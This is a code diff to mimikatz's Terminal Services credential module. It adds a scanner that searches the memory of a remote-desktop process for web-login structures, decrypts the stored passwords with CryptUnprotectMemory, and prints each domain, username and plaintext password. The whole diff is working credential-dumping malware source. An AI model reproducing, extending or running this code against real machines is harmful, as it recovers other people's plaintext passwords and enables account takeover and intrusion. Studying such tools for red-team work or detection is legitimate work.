@@ -204,12 +204,15 @@ NTSTATUS kuhl_m_ts_logonpasswords(int argc, wchar_t * argv[])
 const BYTE MyPattern[] = {0x00, 0x00, 0x00, 0x00, 0xbb, 0x47, /*0x0b, 0x00*/};
 const BYTE MyPattern2[] = {0x00, 0x00, 0x00, 0x00, 0xf3, 0x47, /*0x0b, 0x00*/};
 const BYTE MyPattern3[] = {0x00, 0x00, 0x00, 0x00, 0x3b, 0x01};
+const BYTE MyWebPattern[] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
 BOOL CALLBACK kuhl_m_ts_logonpasswords_MemoryAnalysis(PMEMORY_BASIC_INFORMATION pMemoryBasicInformation, PVOID pvArg)
 {
 	KULL_M_MEMORY_ADDRESS aLocalBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aProcess = {pMemoryBasicInformation->BaseAddress, (PKULL_M_MEMORY_HANDLE) pvArg};
-	PBYTE CurrentPtr, limite;
+	PBYTE CurrentPtr, limite, ref;
 	PWTS_KIWI pKiwiData;
-	BOOL decStatus = TRUE, bIsCandidate;
+	PWTS_WEB_KIWI pWebKiwiData;
+	BOOL decStatus, bIsCandidate;
+	DWORD dwOffset;
 
 	if((pMemoryBasicInformation->Type == MEM_PRIVATE) && (pMemoryBasicInformation->State != MEM_FREE) && (pMemoryBasicInformation->Protect == PAGE_READWRITE))
 	{
@@ -218,7 +221,7 @@ BOOL CALLBACK kuhl_m_ts_logonpasswords_MemoryAnalysis(PMEMORY_BASIC_INFORMATION 
 		{
 			if(kull_m_memory_copy(&aLocalBuffer, &aProcess, pMemoryBasicInformation->RegionSize))
 			{
-				for(CurrentPtr = (PBYTE) aLocalBuffer.address, limite = (PBYTE) aLocalBuffer.address + pMemoryBasicInformation->RegionSize; CurrentPtr + sizeof(MyPattern) <= limite; CurrentPtr++)
+				for(CurrentPtr = (PBYTE) aLocalBuffer.address, limite = (PBYTE) aLocalBuffer.address + pMemoryBasicInformation->RegionSize; CurrentPtr + sizeof(MyWebPattern) <= limite; CurrentPtr += sizeof(PVOID))
 				{
 					pKiwiData = (PWTS_KIWI) CurrentPtr;
 
@@ -232,31 +235,91 @@ BOOL CALLBACK kuhl_m_ts_logonpasswords_MemoryAnalysis(PMEMORY_BASIC_INFORMATION 
 					}
 					else bIsCandidate = FALSE;
 					
-					if(bIsCandidate && !pKiwiData->unk2)
+					if(bIsCandidate)
 					{
-						//kprintf(L"-> %08x (%hu %hu %hu)\n", pKiwiData->unk1, pKiwiData->cbDomain, pKiwiData->cbUsername, pKiwiData->cbPassword);
-						if(!(pKiwiData->cbDomain & 1) && (pKiwiData->cbDomain < sizeof(pKiwiData->Domain)))
+						if(!pKiwiData->unk2)
 						{
-							if(!(pKiwiData->cbUsername & 1) && (pKiwiData->cbUsername > sizeof(wchar_t)) && (pKiwiData->cbUsername < sizeof(pKiwiData->UserName)))
+							//kprintf(L"-> %08x (%hu %hu %hu)\n", pKiwiData->unk1, pKiwiData->cbDomain, pKiwiData->cbUsername, pKiwiData->cbPassword);
+							if(!(pKiwiData->cbDomain & 1) && (pKiwiData->cbDomain < sizeof(pKiwiData->Domain)))
 							{
-								if(!(pKiwiData->cbPassword & 1) && (pKiwiData->cbPassword < sizeof(pKiwiData->Password)))
+								if(!(pKiwiData->cbUsername & 1) && (pKiwiData->cbUsername > sizeof(wchar_t)) && (pKiwiData->cbUsername < sizeof(pKiwiData->UserName)))
 								{
-									kprintf(
-										L"\n   Domain      : %.*s\n"
-										L"   UserName    : %.*s\n",
-										pKiwiData->cbDomain / sizeof(wchar_t), pKiwiData->Domain,
-										pKiwiData->cbUsername/ sizeof(wchar_t), pKiwiData->UserName
-										);
-
-									if(pKiwiData->cbPassword && (MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_10))
+									if(!(pKiwiData->cbPassword & 1) && (pKiwiData->cbPassword < sizeof(pKiwiData->Password)))
 									{
-										decStatus = kull_m_crypto_remote_CryptUnprotectMemory(aProcess.hMemory, pKiwiData->Password, sizeof(pKiwiData->Password), CRYPTPROTECTMEMORY_SAME_PROCESS);
-									}
+										kprintf(
+											L"\n   Domain      : %.*s\n"
+											L"   UserName    : %.*s\n",
+											pKiwiData->cbDomain / sizeof(wchar_t), pKiwiData->Domain,
+											pKiwiData->cbUsername / sizeof(wchar_t), pKiwiData->UserName
+											);
 
+										if(pKiwiData->cbPassword && (MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_10))
+										{
+											decStatus = kull_m_crypto_remote_CryptUnprotectMemory(aProcess.hMemory, pKiwiData->Password, sizeof(pKiwiData->Password), CRYPTPROTECTMEMORY_SAME_PROCESS);
+										}
+										else decStatus = TRUE;
+
+										if(decStatus)
+										{
+											kprintf(L"   Password/Pin: %.*s\n", pKiwiData->cbPassword / sizeof(wchar_t), pKiwiData->Password);
+										}
+									}
+								}
+							}
+						}
+					}
+					else if(RtlEqualMemory(MyWebPattern, CurrentPtr, sizeof(MyWebPattern)))
+					{
+						pWebKiwiData = (PWTS_WEB_KIWI) CurrentPtr;
+						if(
+							(pWebKiwiData->Username.Buffer && !((ULONG_PTR) pWebKiwiData->Username.Buffer % 2) && ((ULONG_PTR) pWebKiwiData->Username.Buffer < 0x1000))
+							&&
+							(pWebKiwiData->Username.Length && !(pWebKiwiData->Username.Length % sizeof(wchar_t)) && (pWebKiwiData->Username.Length < ((WTS_USERNAME_LENGTH + 1) * sizeof(wchar_t))) && ((pWebKiwiData->Username.Length == pWebKiwiData->Username.MaximumLength) || (pWebKiwiData->Username.Length == (pWebKiwiData->Username.MaximumLength - sizeof(wchar_t)))))
+							)
+						{
+							if(
+								(pWebKiwiData->Password.Buffer && !((ULONG_PTR) pWebKiwiData->Password.Buffer % 2) && ((ULONG_PTR) pWebKiwiData->Password.Buffer < 0x1000))
+								&&
+								(pWebKiwiData->Password.Length && !(pWebKiwiData->Password.Length % sizeof(wchar_t)) && (pWebKiwiData->Password.Length < ((WTS_PASSWORD_LENGTH + 1) * sizeof(wchar_t))) && ((pWebKiwiData->Password.Length == pWebKiwiData->Password.MaximumLength) || (pWebKiwiData->Password.Length == (pWebKiwiData->Password.MaximumLength - sizeof(wchar_t)))))
+								)
+							{
+								// Domain is not mandatory here
+								kprintf(L"\n   * Web Credentials? *\n");
+								ref = (PBYTE) aProcess.address + (CurrentPtr - (PBYTE) aLocalBuffer.address);
+
+								if(
+									(pWebKiwiData->Domain.Buffer && !((ULONG_PTR) pWebKiwiData->Domain.Buffer % 2) && ((ULONG_PTR) pWebKiwiData->Domain.Buffer < 0x1000))
+									&&
+									(pWebKiwiData->Domain.Length && !(pWebKiwiData->Domain.Length % sizeof(wchar_t)) && (pWebKiwiData->Domain.Length < ((WTS_DOMAIN_LENGTH + 1) * sizeof(wchar_t))) && ((pWebKiwiData->Domain.Length == pWebKiwiData->Domain.MaximumLength) || (pWebKiwiData->Domain.Length == (pWebKiwiData->Domain.MaximumLength - sizeof(wchar_t)))))
+									)
+								{
+									pWebKiwiData->Domain.Buffer = (PWSTR) (ref + (ULONG_PTR) pWebKiwiData->Domain.Buffer);
+									if(kull_m_process_getUnicodeString(&pWebKiwiData->Domain, aProcess.hMemory))
+									{
+										kprintf(L"   Domain      : %wZ\n", &pWebKiwiData->Domain);
+										LocalFree(pWebKiwiData->Domain.Buffer);
+									}
+								}
+
+								pWebKiwiData->Username.Buffer = (PWSTR) (ref + (ULONG_PTR) pWebKiwiData->Username.Buffer);
+								if(kull_m_process_getUnicodeString(&pWebKiwiData->Username, aProcess.hMemory))
+								{
+									kprintf(L"   UserName    : %wZ\n", &pWebKiwiData->Username);
+									LocalFree(pWebKiwiData->Username.Buffer);
+								}
+
+								pWebKiwiData->Password.Buffer = (PWSTR) (ref + (ULONG_PTR) pWebKiwiData->Password.Buffer);
+								if(kull_m_process_getUnicodeString(&pWebKiwiData->Password, aProcess.hMemory))
+								{
+									decStatus = kull_m_crypto_remote_CryptUnprotectMemory(aProcess.hMemory, pWebKiwiData->Password.Buffer, pWebKiwiData->Password.Length, CRYPTPROTECTMEMORY_SAME_PROCESS);
 									if(decStatus)
 									{
-										kprintf(L"   Password/Pin: %.*s\n", pKiwiData->cbPassword / sizeof(wchar_t), pKiwiData->Password);
+										dwOffset = (lstrlen(pWebKiwiData->Password.Buffer) + 1) * sizeof(wchar_t);
+										kprintf(L"   Password/Pin: %s\n ", pWebKiwiData->Password.Buffer);
 									}
+									else kuhl_m_sekurlsa_trymarshal(&pWebKiwiData->Password);
+
+									LocalFree(pWebKiwiData->Password.Buffer);
 								}
 							}
 						}
